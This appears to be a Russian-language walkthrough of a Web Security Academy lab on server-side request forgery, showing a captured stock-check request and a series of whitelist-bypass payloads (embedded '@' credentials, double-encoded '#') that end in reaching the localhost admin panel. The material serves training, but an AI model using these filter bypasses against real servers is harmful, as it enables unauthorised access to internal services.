Есть функция проверки запасов, которая извлекает данные из внутренней системы.

## Дано

...

## Задача

измените URL-адрес проверки запасов, чтобы получить доступ к интерфейсу администратора по адресу `http://localhost/admin` и удалить пользователя `carlos`.

# Разведка

перейдём сразу к проверки запасов 

Формат запроса
```
POST /product/stock HTTP/2
Host: 0ace00b903fd682082b229cb00620064.web-security-academy.net
Cookie: session=eQC4YohXiObtnaHFRf17vWaPU1vRucB9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0ace00b903fd682082b229cb00620064.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0ace00b903fd682082b229cb00620064.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D2
```

- `stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D2` - кодировка только спец символов url
- `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=2` - ответ 200

- При изменение url адреса выводит ошибку `"External stock check host must be stock.weliketoshop.net"`  что означает проверку хоста

#### Проверка фильтра на основе белого списка

- ==Можно встроить учетные данные в URL-адрес перед именем хоста, используя `@` характер. Например:==
    ==`https://hack@example.com==
	==В зависимости от анализатора URL-адресов он может обработать `https://hack` или `https://example.com`==
==Уязвим==

- ==Можно использовать `#` символ в URL. Например:==    
    ==`https://evil-host#comment`==
    ==`#` - отбрасывает всё то что после неё==
==Уязвим==

- Использовать `#` символ, обозначающий фрагмент URL. Например:    
    `https://evil-host#expected-host`

- Использовать иерархию имен DNS, чтобы поместить необходимые входные данные в полное DNS-имя, которым вы управляете. Например:
    `https://expected-host.evil-host`

- Закодировать символы URL-адреса, чтобы запутать код анализа URL-адресов. 

- Использовать комбинации этих техник вместе.

# Атака

- `http://test@stock.weliketoshop.net:8080`  - ответ ошибка что не смогли подключиться к серверу

- `http://test#@stock.weliketoshop.net:8080` - ответ о том что сервер одобряет только stock.weliketoshop.net, значит анализатор работает по пути `http://test`

- `http%3a//test%2523%40stock.weliketoshop.net%3a8080` - ответ 500, закодировали два раза # (ошибка "Не удалось подключиться к внешней службе проверки запасов")

- `http%3a//localhost%2523%40stock.weliketoshop.net%3a8080` - ответ 200 мы зашли 

- `http%3a//localhost%2523%40stock.weliketoshop.net%3a8080/admin` - вошли в админ панель